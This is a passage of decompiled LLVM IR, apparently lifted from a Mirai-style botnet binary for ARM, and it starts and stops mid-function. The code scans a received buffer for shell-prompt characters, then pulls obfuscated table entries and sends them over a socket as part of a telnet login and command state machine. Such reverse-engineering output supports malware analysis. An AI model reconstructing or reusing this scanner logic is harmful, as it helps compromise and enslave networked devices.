  %v2_10ec0 = icmp ugt i8 %v3_10ea8, 34
  store i1 %v2_10ec0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ec0 = icmp eq i8 %v3_10ea8, 35
  store i1 %v7_10ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ec0, label %dec_label_pc_10f10, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10ec0
  %v2_10ec8 = icmp ugt i8 %v3_10ea8, 36
  store i1 %v2_10ec8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ec8 = icmp eq i8 %v3_10ea8, 37
  store i1 %v7_10ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ec8, label %dec_label_pc_10f10, label %dec_label_pc_10ef8.preheader

dec_label_pc_10ef8.preheader:                     ; preds = %dec_label_pc_10ec8
  %v3_10ecc = add i32 %v0_10d4c, 28
  %v2_10ed0 = add i32 %v3_10ecc, %v3_10e94
  store i32 %v2_10ed0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ef8

dec_label_pc_10edc:                               ; preds = %bb395
  %v2_10edc = icmp ugt i8 %v3_10f00, 35
  store i1 %v2_10edc, i1* %cpsr_c.global-to-local, align 1
  %v7_10edc = icmp eq i8 %v3_10f00, 36
  store i1 %v7_10edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10edc, label %dec_label_pc_10f10, label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10edc
  %v2_10ee4 = icmp ugt i8 %v3_10f00, 34
  store i1 %v2_10ee4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ee4 = icmp eq i8 %v3_10f00, 35
  store i1 %v7_10ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ee4, label %dec_label_pc_10f10, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ee4
  %v2_10eec = icmp ugt i8 %v3_10f00, 36
  store i1 %v2_10eec, i1* %cpsr_c.global-to-local, align 1
  %v7_10eec = icmp eq i8 %v3_10f00, 37
  store i1 %v7_10eec, i1* %cpsr_z.global-to-local, align 1
  %v1_10ef0 = add i32 %v0_10ef0, -1
  store i32 %v1_10ef0, i32* %r3.global-to-local, align 4
  br i1 %v7_10eec, label %dec_label_pc_10f10, label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ef8.preheader, %dec_label_pc_10eec
  %v0_10ef0 = phi i32 [ %v2_10ed0, %dec_label_pc_10ef8.preheader ], [ %v1_10ef0, %dec_label_pc_10eec ]
  %v0_10ef8 = phi i32 [ %v1_10e98, %dec_label_pc_10ef8.preheader ], [ %v1_10ef8, %dec_label_pc_10eec ]
  %v1_10ef8 = add i32 %v0_10ef8, -1
  store i32 %v1_10ef8, i32* %r1.global-to-local, align 4
  %v2_10ef8 = icmp ne i32 %v0_10ef8, 0
  store i1 %v2_10ef8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef8 = icmp eq i32 %v0_10ef8, 1
  store i1 %v7_10ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef8, label %dec_label_pc_10cd0.backedge.thread528, label %dec_label_pc_10f00

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ef8
  %v1_10f00 = add i32 %v0_10ef0, -2
  %v2_10f00 = inttoptr i32 %v1_10f00 to i8*
  %v3_10f00 = load i8, i8* %v2_10f00, align 1
  %v4_10f00 = zext i8 %v3_10f00 to i32
  store i32 %v4_10f00, i32* %r2.global-to-local, align 4
  %v2_10f04 = icmp ugt i8 %v3_10f00, 61
  store i1 %v2_10f04, i1* %cpsr_c.global-to-local, align 1
  %v7_10f04 = icmp eq i8 %v3_10f00, 62
  store i1 %v7_10f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f04, label %dec_label_pc_10f10, label %bb395

bb395:                                            ; preds = %dec_label_pc_10f00
  %v3_10f08 = icmp ugt i8 %v3_10f00, 57
  store i1 %v3_10f08, i1* %cpsr_c.global-to-local, align 1
  %v8_10f08 = icmp eq i8 %v3_10f00, 58
  store i1 %v8_10f08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f08, label %dec_label_pc_10f10, label %dec_label_pc_10edc

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10f00, %bb395, %dec_label_pc_10eec, %dec_label_pc_10ee4, %dec_label_pc_10edc, %dec_label_pc_10ec8, %dec_label_pc_10ea4, %dec_label_pc_10ec0, %dec_label_pc_10eb8, %bb394
  %v0_10f14 = phi i32 [ %v1_10e98, %dec_label_pc_10ec8 ], [ %v1_10e98, %dec_label_pc_10ea4 ], [ %v1_10e98, %dec_label_pc_10ec0 ], [ %v1_10e98, %dec_label_pc_10eb8 ], [ %v1_10e98, %bb394 ], [ %v1_10ef8, %dec_label_pc_10edc ], [ %v1_10ef8, %dec_label_pc_10ee4 ], [ %v1_10ef8, %dec_label_pc_10eec ], [ %v1_10ef8, %bb395 ], [ %v1_10ef8, %dec_label_pc_10f00 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10f14 = add i32 %v0_10f14, 1
  store i32 %v1_10f14, i32* @r7, align 4
  %v1_10f18 = call i32 @table_unlock_val(i32 26)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10f28 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_10f28, i32* %r0.global-to-local, align 4
  %v3_10f2c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10f2c, i32* %r2.global-to-local, align 4
  store i32 %v3_10f28, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f38 = load i32, i32* @r5, align 4
  %v1_10f38 = add i32 %v0_10f38, 4
  %v2_10f38 = inttoptr i32 %v1_10f38 to i32*
  %v3_10f38 = load i32, i32* %v2_10f38, align 4
  store i32 %v3_10f38, i32* %r0.global-to-local, align 4
  %v4_10f3c = call i32 @__libc_send(i32 %v3_10f38, i32 %v3_10f28, i32 %v3_10f2c, i32 16384)
  store i32 %v4_10f3c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f4c = load i32, i32* @r5, align 4
  %v1_10f4c = add i32 %v0_10f4c, 4
  %v2_10f4c = inttoptr i32 %v1_10f4c to i32*
  %v3_10f4c = load i32, i32* %v2_10f4c, align 4
  store i32 %v3_10f4c, i32* %r0.global-to-local, align 4
  %v4_10f50 = call i32 @__libc_send(i32 %v3_10f4c, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10f58 = call i32 @table_lock_val(i32 26)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10f60 = load i32, i32* @r5, align 4
  %v2_10f60 = add i32 %v1_10f60, 12
  %v3_10f60 = inttoptr i32 %v2_10f60 to i32*
  store i32 10, i32* %v3_10f60, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10d4c
  %v1_10f68 = add i32 %v0_10d4c, 24
  %v2_10f68 = inttoptr i32 %v1_10f68 to i32*
  %v3_10f68 = load i32, i32* %v2_10f68, align 4
  store i32 %v3_10f68, i32* %r2.global-to-local, align 4
  %v1_10f6c = add i32 %v3_10f68, -1
  store i32 %v1_10f6c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f70 = icmp eq i32 %v1_10f6c, 0
  store i1 %v2_10f70, i1* %cpsr_z.global-to-local, align 1
  %tmp396 = icmp slt i32 %v1_10f6c, 1
  br i1 %tmp396, label %dec_label_pc_10cd0.backedge.thread, label %dec_label_pc_10f78

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f68
  %v2_10f78 = add i32 %v1_10f6c, %v0_10d4c
  store i32 %v2_10f78, i32* %r3.global-to-local, align 4
  %v1_10f7c = add i32 %v2_10f78, 28
  %v2_10f7c = inttoptr i32 %v1_10f7c to i8*
  %v3_10f7c = load i8, i8* %v2_10f7c, align 1
  %v4_10f7c = zext i8 %v3_10f7c to i32
  store i32 %v4_10f7c, i32* %r3.global-to-local, align 4
  %v2_10f80 = icmp ugt i8 %v3_10f7c, 61
  store i1 %v2_10f80, i1* %cpsr_c.global-to-local, align 1
  %v7_10f80 = icmp eq i8 %v3_10f7c, 62
  store i1 %v7_10f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f80, label %dec_label_pc_10fe4, label %bb397

bb397:                                            ; preds = %dec_label_pc_10f78
  %v3_10f84 = icmp ugt i8 %v3_10f7c, 57
  store i1 %v3_10f84, i1* %cpsr_c.global-to-local, align 1
  %v8_10f84 = icmp eq i8 %v3_10f7c, 58
  store i1 %v8_10f84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f84, label %dec_label_pc_10fe4, label %dec_label_pc_10f8c

dec_label_pc_10f8c:                               ; preds = %bb397
  %v2_10f8c = icmp ugt i8 %v3_10f7c, 35
  store i1 %v2_10f8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f8c = icmp eq i8 %v3_10f7c, 36
  store i1 %v7_10f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f8c, label %dec_label_pc_10fe4, label %dec_label_pc_10f94

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f8c
  %v2_10f94 = icmp ugt i8 %v3_10f7c, 34
  store i1 %v2_10f94, i1* %cpsr_c.global-to-local, align 1
  %v7_10f94 = icmp eq i8 %v3_10f7c, 35
  store i1 %v7_10f94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f94, label %dec_label_pc_10fe4, label %dec_label_pc_10f9c

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f94
  %v2_10f9c = icmp ugt i8 %v3_10f7c, 36
  store i1 %v2_10f9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f9c = icmp eq i8 %v3_10f7c, 37
  store i1 %v7_10f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f9c, label %dec_label_pc_10fe4, label %dec_label_pc_10fcc.preheader

dec_label_pc_10fcc.preheader:                     ; preds = %dec_label_pc_10f9c
  %v3_10fa0 = add i32 %v0_10d4c, 28
  %v2_10fa4 = add i32 %v3_10fa0, %v3_10f68
  store i32 %v2_10fa4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_10fb0:                               ; preds = %bb398
  %v2_10fb0 = icmp ugt i8 %v3_10fd4, 35
  store i1 %v2_10fb0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb0 = icmp eq i8 %v3_10fd4, 36
  store i1 %v7_10fb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb0, label %dec_label_pc_10fe4, label %dec_label_pc_10fb8

dec_label_pc_10fb8:                               ; preds = %dec_label_pc_10fb0
  %v2_10fb8 = icmp ugt i8 %v3_10fd4, 34
  store i1 %v2_10fb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb8 = icmp eq i8 %v3_10fd4, 35
  store i1 %v7_10fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb8, label %dec_label_pc_10fe4, label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fb8
  %v2_10fc0 = icmp ugt i8 %v3_10fd4, 36
  store i1 %v2_10fc0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc0 = icmp eq i8 %v3_10fd4, 37
  store i1 %v7_10fc0, i1* %cpsr_z.global-to-local, align 1
  %v1_10fc4 = add i32 %v0_10fc4, -1
  store i32 %v1_10fc4, i32* %r3.global-to-local, align 4
  br i1 %v7_10fc0, label %dec_label_pc_10fe4, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fcc.preheader, %dec_label_pc_10fc0
  %v0_10fc4 = phi i32 [ %v2_10fa4, %dec_label_pc_10fcc.preheader ], [ %v1_10fc4, %dec_label_pc_10fc0 ]
  %v0_10fcc = phi i32 [ %v1_10f6c, %dec_label_pc_10fcc.preheader ], [ %v1_10fcc, %dec_label_pc_10fc0 ]
  %v1_10fcc = add i32 %v0_10fcc, -1
  store i32 %v1_10fcc, i32* %r1.global-to-local, align 4
  %v2_10fcc = icmp ne i32 %v0_10fcc, 0
  store i1 %v2_10fcc, i1* %cpsr_c.global-to-local, align 1
  %v7_10fcc = icmp eq i32 %v0_10fcc, 1
  store i1 %v7_10fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fcc, label %dec_label_pc_10cd0.backedge.thread528, label %dec_label_pc_10fd4

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fcc
  %v1_10fd4 = add i32 %v0_10fc4, -2
  %v2_10fd4 = inttoptr i32 %v1_10fd4 to i8*
  %v3_10fd4 = load i8, i8* %v2_10fd4, align 1
  %v4_10fd4 = zext i8 %v3_10fd4 to i32
  store i32 %v4_10fd4, i32* %r2.global-to-local, align 4
  %v2_10fd8 = icmp ugt i8 %v3_10fd4, 61
  store i1 %v2_10fd8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd8 = icmp eq i8 %v3_10fd4, 62
  store i1 %v7_10fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd8, label %dec_label_pc_10fe4, label %bb398

bb398:                                            ; preds = %dec_label_pc_10fd4
  %v3_10fdc = icmp ugt i8 %v3_10fd4, 57
  store i1 %v3_10fdc, i1* %cpsr_c.global-to-local, align 1
  %v8_10fdc = icmp eq i8 %v3_10fd4, 58
  store i1 %v8_10fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fdc, label %dec_label_pc_10fe4, label %dec_label_pc_10fb0

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10fd4, %bb398, %dec_label_pc_10fc0, %dec_label_pc_10fb8, %dec_label_pc_10fb0, %dec_label_pc_10f9c, %dec_label_pc_10f78, %dec_label_pc_10f94, %dec_label_pc_10f8c, %bb397
  %v0_10fe8 = phi i32 [ %v1_10f6c, %dec_label_pc_10f9c ], [ %v1_10f6c, %dec_label_pc_10f78 ], [ %v1_10f6c, %dec_label_pc_10f94 ], [ %v1_10f6c, %dec_label_pc_10f8c ], [ %v1_10f6c, %bb397 ], [ %v1_10fcc, %dec_label_pc_10fb0 ], [ %v1_10fcc, %dec_label_pc_10fb8 ], [ %v1_10fcc, %dec_label_pc_10fc0 ], [ %v1_10fcc, %bb398 ], [ %v1_10fcc, %dec_label_pc_10fd4 ]
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_10fe8 = add i32 %v0_10fe8, 1
  store i32 %v1_10fe8, i32* @r7, align 4
  %v1_10fec = call i32 @table_unlock_val(i32 22)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_10ffc = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-60)
  store i32 %v3_10ffc, i32* %r0.global-to-local, align 4
  %v3_11000 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11000, i32* %r2.global-to-local, align 4
  store i32 %v3_10ffc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1100c = load i32, i32* @r5, align 4
  %v1_1100c = add i32 %v0_1100c, 4
  %v2_1100c = inttoptr i32 %v1_1100c to i32*
  %v3_1100c = load i32, i32* %v2_1100c, align 4
  store i32 %v3_1100c, i32* %r0.global-to-local, align 4
  %v4_11010 = call i32 @__libc_send(i32 %v3_1100c, i32 %v3_10ffc, i32 %v3_11000, i32 16384)
  store i32 %v4_11010, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11020 = load i32, i32* @r5, align 4
  %v1_11020 = add i32 %v0_11020, 4
  %v2_11020 = inttoptr i32 %v1_11020 to i32*
  %v3_11020 = load i32, i32* %v2_11020, align 4
  store i32 %v3_11020, i32* %r0.global-to-local, align 4
  %v4_11024 = call i32 @__libc_send(i32 %v3_11020, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_1102c = call i32 @table_lock_val(i32 22)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_11034 = load i32, i32* @r5, align 4
  %v2_11034 = add i32 %v1_11034, 12
  %v3_11034 = inttoptr i32 %v2_11034 to i32*
  store i32 8, i32* %v3_11034, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_1103c:                               ; preds = %dec_label_pc_10d4c
  %v1_1103c = add i32 %v0_10d4c, 24
  %v2_1103c = inttoptr i32 %v1_1103c to i32*
  %v3_1103c = load i32, i32* %v2_1103c, align 4
  store i32 %v3_1103c, i32* %r2.global-to-local, align 4
  %v1_11040 = add i32 %v3_1103c, -1
  store i32 %v1_11040, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11044 = icmp eq i32 %v1_11040, 0
  store i1 %v2_11044, i1* %cpsr_z.global-to-local, align 1
  %tmp399 = icmp slt i32 %v1_11040, 1
  br i1 %tmp399, label %dec_label_pc_10cd0.backedge.thread, label %dec_label_pc_1104c

dec_label_pc_1104c:                               ; preds = %dec_label_pc_1103c
  %v2_1104c = add i32 %v1_11040, %v0_10d4c
  store i32 %v2_1104c, i32* %r3.global-to-local, align 4
  %v1_11050 = add i32 %v2_1104c, 28
  %v2_11050 = inttoptr i32 %v1_11050 to i8*
  %v3_11050 = load i8, i8* %v2_11050, align 1
  %v4_11050 = zext i8 %v3_11050 to i32
  store i32 %v4_11050, i32* %r3.global-to-local, align 4
  %v2_11054 = icmp ugt i8 %v3_11050, 61
  store i1 %v2_11054, i1* %cpsr_c.global-to-local, align 1
  %v7_11054 = icmp eq i8 %v3_11050, 62
  store i1 %v7_11054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11054, label %dec_label_pc_110b8, label %bb400

bb400:                                            ; preds = %dec_label_pc_1104c
  %v3_11058 = icmp ugt i8 %v3_11050, 57
  store i1 %v3_11058, i1* %cpsr_c.global-to-local, align 1
  %v8_11058 = icmp eq i8 %v3_11050, 58
  store i1 %v8_11058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11058, label %dec_label_pc_110b8, label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %bb400
  %v2_11060 = icmp ugt i8 %v3_11050, 35
  store i1 %v2_11060, i1* %cpsr_c.global-to-local, align 1
  %v7_11060 = icmp eq i8 %v3_11050, 36
  store i1 %v7_11060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11060, label %dec_label_pc_110b8, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11060
  %v2_11068 = icmp ugt i8 %v3_11050, 34
  store i1 %v2_11068, i1* %cpsr_c.global-to-local, align 1
  %v7_11068 = icmp eq i8 %v3_11050, 35
  store i1 %v7_11068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11068, label %dec_label_pc_110b8, label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %dec_label_pc_11068
  %v2_11070 = icmp ugt i8 %v3_11050, 36
  store i1 %v2_11070, i1* %cpsr_c.global-to-local, align 1
  %v7_11070 = icmp eq i8 %v3_11050, 37
  store i1 %v7_11070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11070, label %dec_label_pc_110b8, label %dec_label_pc_110a0.preheader

dec_label_pc_110a0.preheader:                     ; preds = %dec_label_pc_11070
  %v3_11074 = add i32 %v0_10d4c, 28
  %v2_11078 = add i32 %v3_11074, %v3_1103c
  store i32 %v2_11078, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_110a0

dec_label_pc_11084:                               ; preds = %bb401
  %v2_11084 = icmp ugt i8 %v3_110a8, 35
  store i1 %v2_11084, i1* %cpsr_c.global-to-local, align 1
  %v7_11084 = icmp eq i8 %v3_110a8, 36
  store i1 %v7_11084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11084, label %dec_label_pc_110b8, label %dec_label_pc_1108c

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11084
  %v2_1108c = icmp ugt i8 %v3_110a8, 34
  store i1 %v2_1108c, i1* %cpsr_c.global-to-local, align 1
  %v7_1108c = icmp eq i8 %v3_110a8, 35
  store i1 %v7_1108c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1108c, label %dec_label_pc_110b8, label %dec_label_pc_11094

dec_label_pc_11094:                               ; preds = %dec_label_pc_1108c
  %v2_11094 = icmp ugt i8 %v3_110a8, 36
  store i1 %v2_11094, i1* %cpsr_c.global-to-local, align 1
  %v7_11094 = icmp eq i8 %v3_110a8, 37
  store i1 %v7_11094, i1* %cpsr_z.global-to-local, align 1
  %v1_11098 = add i32 %v0_11098, -1
  store i32 %v1_11098, i32* %r3.global-to-local, align 4
  br i1 %v7_11094, label %dec_label_pc_110b8, label %dec_label_pc_110a0

dec_label_pc_110a0:                               ; preds = %dec_label_pc_110a0.preheader, %dec_label_pc_11094
  %v0_11098 = phi i32 [ %v2_11078, %dec_label_pc_110a0.preheader ], [ %v1_11098, %dec_label_pc_11094 ]
  %v0_110a0 = phi i32 [ %v1_11040, %dec_label_pc_110a0.preheader ], [ %v1_110a0, %dec_label_pc_11094 ]
  %v1_110a0 = add i32 %v0_110a0, -1
  store i32 %v1_110a0, i32* %r1.global-to-local, align 4
  %v2_110a0 = icmp ne i32 %v0_110a0, 0
  store i1 %v2_110a0, i1* %cpsr_c.global-to-local, align 1
  %v7_110a0 = icmp eq i32 %v0_110a0, 1
  store i1 %v7_110a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110a0, label %dec_label_pc_10cd0.backedge.thread528, label %dec_label_pc_110a8

dec_label_pc_110a8:                               ; preds = %dec_label_pc_110a0
  %v1_110a8 = add i32 %v0_11098, -2
  %v2_110a8 = inttoptr i32 %v1_110a8 to i8*
  %v3_110a8 = load i8, i8* %v2_110a8, align 1
  %v4_110a8 = zext i8 %v3_110a8 to i32
  store i32 %v4_110a8, i32* %r2.global-to-local, align 4
  %v2_110ac = icmp ugt i8 %v3_110a8, 61
  store i1 %v2_110ac, i1* %cpsr_c.global-to-local, align 1
  %v7_110ac = icmp eq i8 %v3_110a8, 62
  store i1 %v7_110ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110ac, label %dec_label_pc_110b8, label %bb401

bb401:                                            ; preds = %dec_label_pc_110a8
  %v3_110b0 = icmp ugt i8 %v3_110a8, 57
  store i1 %v3_110b0, i1* %cpsr_c.global-to-local, align 1
  %v8_110b0 = icmp eq i8 %v3_110a8, 58
  store i1 %v8_110b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_110b0, label %dec_label_pc_110b8, label %dec_label_pc_11084

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110a8, %bb401, %dec_label_pc_11094, %dec_label_pc_1108c, %dec_label_pc_11084, %dec_label_pc_11070, %dec_label_pc_1104c, %dec_label_pc_11068, %dec_label_pc_11060, %bb400
  %v0_110bc = phi i32 [ %v1_11040, %dec_label_pc_11070 ], [ %v1_11040, %dec_label_pc_1104c ], [ %v1_11040, %dec_label_pc_11068 ], [ %v1_11040, %dec_label_pc_11060 ], [ %v1_11040, %bb400 ], [ %v1_110a0, %dec_label_pc_11084 ], [ %v1_110a0, %dec_label_pc_1108c ], [ %v1_110a0, %dec_label_pc_11094 ], [ %v1_110a0, %bb401 ], [ %v1_110a0, %dec_label_pc_110a8 ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_110bc = add i32 %v0_110bc, 1
  store i32 %v1_110bc, i32* @r7, align 4
  %v1_110c0 = call i32 @table_unlock_val(i32 24)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_110d0 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_110d0, i32* %r0.global-to-local, align 4
  %v3_110d4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_110d4, i32* %r2.global-to-local, align 4
  store i32 %v3_110d0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110e0 = load i32, i32* @r5, align 4
  %v1_110e0 = add i32 %v0_110e0, 4
  %v2_110e0 = inttoptr i32 %v1_110e0 to i32*
  %v3_110e0 = load i32, i32* %v2_110e0, align 4
  store i32 %v3_110e0, i32* %r0.global-to-local, align 4
  %v4_110e4 = call i32 @__libc_send(i32 %v3_110e0, i32 %v3_110d0, i32 %v3_110d4, i32 16384)
  store i32 %v4_110e4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110f4 = load i32, i32* @r5, align 4
  %v1_110f4 = add i32 %v0_110f4, 4
  %v2_110f4 = inttoptr i32 %v1_110f4 to i32*
  %v3_110f4 = load i32, i32* %v2_110f4, align 4
  store i32 %v3_110f4, i32* %r0.global-to-local, align 4
  %v4_110f8 = call i32 @__libc_send(i32 %v3_110f4, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11100 = call i32 @table_lock_val(i32 24)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_11108 = load i32, i32* @r5, align 4
  %v2_11108 = add i32 %v1_11108, 12
  %v3_11108 = inttoptr i32 %v2_11108 to i32*
  store i32 7, i32* %v3_11108, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_11110:                               ; preds = %dec_label_pc_10d4c
  %v1_11110 = add i32 %v0_10d4c, 24
  %v2_11110 = inttoptr i32 %v1_11110 to i32*
  %v3_11110 = load i32, i32* %v2_11110, align 4
  store i32 %v3_11110, i32* %r2.global-to-local, align 4
  %v1_11114 = add i32 %v3_11110, -1
  store i32 %v1_11114, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11118 = icmp eq i32 %v1_11114, 0
  store i1 %v2_11118, i1* %cpsr_z.global-to-local, align 1
  %tmp402 = icmp slt i32 %v1_11114, 1
  br i1 %tmp402, label %dec_label_pc_10cd0.backedge.thread, label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %dec_label_pc_11110
  %v2_11120 = add i32 %v1_11114, %v0_10d4c
  store i32 %v2_11120, i32* %r3.global-to-local, align 4
  %v1_11124 = add i32 %v2_11120, 28
  %v2_11124 = inttoptr i32 %v1_11124 to i8*
  %v3_11124 = load i8, i8* %v2_11124, align 1
  %v4_11124 = zext i8 %v3_11124 to i32
  store i32 %v4_11124, i32* %r3.global-to-local, align 4
  %v2_11128 = icmp ugt i8 %v3_11124, 61
  store i1 %v2_11128, i1* %cpsr_c.global-to-local, align 1
  %v7_11128 = icmp eq i8 %v3_11124, 62
  store i1 %v7_11128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11128, label %dec_label_pc_1118c, label %bb403

bb403:                                            ; preds = %dec_label_pc_11120
  %v3_1112c = icmp ugt i8 %v3_11124, 57
  store i1 %v3_1112c, i1* %cpsr_c.global-to-local, align 1
  %v8_1112c = icmp eq i8 %v3_11124, 58
  store i1 %v8_1112c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1112c, label %dec_label_pc_1118c, label %dec_label_pc_11134

dec_label_pc_11134:                               ; preds = %bb403
  %v2_11134 = icmp ugt i8 %v3_11124, 35
  store i1 %v2_11134, i1* %cpsr_c.global-to-local, align 1
  %v7_11134 = icmp eq i8 %v3_11124, 36
  store i1 %v7_11134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11134, label %dec_label_pc_1118c, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11134
  %v2_1113c = icmp ugt i8 %v3_11124, 34
  store i1 %v2_1113c, i1* %cpsr_c.global-to-local, align 1
  %v7_1113c = icmp eq i8 %v3_11124, 35
  store i1 %v7_1113c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1113c, label %dec_label_pc_1118c, label %dec_label_pc_11144

dec_label_pc_11144:                               ; preds = %dec_label_pc_1113c
  %v2_11144 = icmp ugt i8 %v3_11124, 36
  store i1 %v2_11144, i1* %cpsr_c.global-to-local, align 1
  %v7_11144 = icmp eq i8 %v3_11124, 37
  store i1 %v7_11144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11144, label %dec_label_pc_1118c, label %dec_label_pc_11174.preheader

dec_label_pc_11174.preheader:                     ; preds = %dec_label_pc_11144
  %v3_11148 = add i32 %v0_10d4c, 28
  %v2_1114c = add i32 %v3_11148, %v3_11110
  store i32 %v2_1114c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11174

dec_label_pc_11158:                               ; preds = %bb404
  %v2_11158 = icmp ugt i8 %v3_1117c, 35
  store i1 %v2_11158, i1* %cpsr_c.global-to-local, align 1
  %v7_11158 = icmp eq i8 %v3_1117c, 36
  store i1 %v7_11158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11158, label %dec_label_pc_1118c, label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_11158
